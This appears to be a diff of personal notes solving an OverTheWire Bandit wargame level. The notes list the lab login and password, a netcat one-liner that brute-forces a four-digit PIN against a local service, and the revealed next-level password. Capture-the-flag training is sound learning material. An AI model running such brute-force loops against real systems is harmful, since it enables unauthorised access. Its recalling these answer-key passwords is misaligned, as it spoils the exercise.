@@ -1,0 +1,6 @@
+ssh bandit24@bandit.labs.overthewire.org -p 2220
+pass: hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+
+for i in {0000..9999}; do echo hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i; done | nc localhost 30002
+Correct!
+The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
